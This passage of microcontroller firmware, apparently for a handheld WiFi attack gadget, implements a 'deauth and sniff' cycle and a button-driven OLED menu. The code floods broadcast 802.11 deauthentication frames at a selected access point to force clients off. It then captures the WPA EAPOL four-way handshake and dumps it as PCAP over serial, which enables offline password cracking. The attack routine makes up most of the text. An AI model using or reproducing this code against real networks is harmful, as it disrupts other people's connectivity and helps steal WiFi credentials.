  Serial.print("Switched to channel: ");
  Serial.println(scan_results[scrollindex].channel);

  // Overall timeout for the entire cycle.
  unsigned long overallStart = millis();
  const unsigned long overallTimeout = 60000; // 60 seconds overall timeout

  // Phase durations.
  const unsigned long deauthInterval = 6000; // 5 seconds deauth phase
  const unsigned long sniffInterval = 3000;  // 2 seconds sniff phase

  // Spinner animation for the sniff phase.
  const char spinnerChars[] = { '/', '-', '\\', '|' };
  unsigned int spinnerIndex = 0;

  bool cancelled = false;

  // Function to check for a "long press" (i.e. held for >500ms)
  auto checkForCancel = []() -> bool {
    if (digitalRead(BTN_OK) == LOW) {
      unsigned long pressStart = millis();
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
        if (millis() - pressStart > 500) {
          return true; // Cancel if held for more than 500ms
        }
      }
    }
    return false;
  };

  // Outer loop: alternate deauth and sniff until handshake is complete,
  // overall timeout, or user cancels.
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount == 0) &&
         (millis() - overallStart < overallTimeout)) {

    // Check for cancellation using our helper function.
    if (checkForCancel()) {
      cancelled = true;
      Serial.println("User canceled deauth+sniff cycle.");
      break;
    }

    // ----- Deauth Phase -----
    Serial.println("Starting deauth phase...");
    unsigned long deauthPhaseStart = millis();
    while (millis() - deauthPhaseStart < deauthInterval) {
      // Check for cancellation inside the phase.
      if (checkForCancel()) {
        cancelled = true;
        break;
      }
      memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);
      deauth_reason = 1;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 4;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      deauth_reason = 16;
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    
      delay(100);
    }
    if (cancelled) break;

    // ----- Sniff Phase -----
    Serial.println("Starting sniff phase...");
    enableSniffing();
    unsigned long sniffPhaseStart = millis();
    while (millis() - sniffPhaseStart < sniffInterval) {
      if (checkForCancel()) {
        cancelled = true;
        break;
      }
      // Update OLED display with progress and spinner.
      display.clearDisplay();
      display.setTextSize(1);
      display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
      display.setCursor(5, 10);
      display.print("Sniffing ");
      display.print(SelectedSSID);
      display.setCursor(5, 30);
      display.print("EAPOL: ");
      display.print(capturedHandshake.frameCount);
      display.print("/4");
      display.setCursor(5, 45);
      display.print("Progress: ");
      display.print(spinnerChars[spinnerIndex % 4]);
      display.display();

      spinnerIndex++;
      delay(100);
      // If handshake is complete, exit early.
      if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
          capturedManagement.frameCount > 0) {
        break;
      }
    }
    disableSniffing();
    if (cancelled) break;

    Serial.print("Current handshake count: ");
    Serial.println(capturedHandshake.frameCount);
  }

  // Final display update.
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
  display.setCursor(5, 10);
  if (cancelled) {
    display.println("Sniffing canceled!");
  } else if (capturedHandshake.frameCount >= MAX_HANDSHAKE_FRAMES &&
             capturedManagement.frameCount > 0) {
    display.println("Sniffing complete!");
    printHandshakeData();
    sendPcapToSerial();

    
  } else {
    display.println("Sniff timeout!");
  }
  display.setCursor(5, 30);
  display.print("EAPOL captured: ");
  display.print(capturedHandshake.frameCount);
  display.print("/4");
  display.setCursor(5, 45);
  display.println("Press OK to return");
  display.display();

  // Wait for user to press OK to return.
  while (digitalRead(BTN_OK) != LOW) {
    delay(10);
  }
  delay(150); // Debounce

  Serial.println("Finished deauth+sniff cycle.");
}















void loop() {
  unsigned long currentTime = millis();

  // Always draw the main menu.
  drawMainMenu();

  // Check if the OK (select) button was pressed.
  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
      // Decide what to do based on the currently visible item.
      int actualIndex = selectedIndex + menuOffset;  // Map visible index to full array index.
      if (actualIndex == 0) {
        // "Attack" option
        attackLoop();
      } else if (actualIndex == 1) {
        // "Scan" option
        display.clearDisplay();
        drawScanScreen();
        if (scanNetworks() == 0) {
          drawStatusBar("SCAN COMPLETE");
          display.display();
          delay(1000);
        }
      } else if (actualIndex == 2) {
        // "Select" option
        networkSelectionLoop();
      } else if (actualIndex == 3) {
        // "Sniff" option
        startSniffing();
      } else if (actualIndex == 4) { 
          deauthAndSniff();
      }
      lastOkTime = currentTime;
    }
  }

  // Handle BTN_DOWN
  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      // If the select button is held, we adjust the menu offset.
      if (digitalRead(BTN_OK) == LOW) {
        // If not at the bottom page yet, scroll down.
        if (menuOffset < TOTAL_MENU_ITEMS - 3) {
          menuOffset++;
          // Optionally, set selectedIndex to the middle (or leave as is)
          selectedIndex = 0;  // Reset visible selection
        }
      } else {
        // Normal navigation: move the selection down.
        if (selectedIndex < 2) {
          selectedIndex++;
        } else if (menuOffset < TOTAL_MENU_ITEMS - 3) {
          // If at the bottom of the visible list, scroll down.
          menuOffset++;
        }
      }
      lastDownTime = currentTime;
    }
  }

  // Handle BTN_UP
  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (digitalRead(BTN_OK) == LOW) {
        // With select pressed, scroll upward if possible.
        if (menuOffset > 0) {
          menuOffset--;
          selectedIndex = 0;  // or keep the same relative index
        }
      } else {
        // Normal navigation: move selection up.
        if (selectedIndex > 0) {
          selectedIndex--;
        } else if (menuOffset > 0) {
          menuOffset--;
        }
      }
      lastUpTime = currentTime;
    }
  }
}

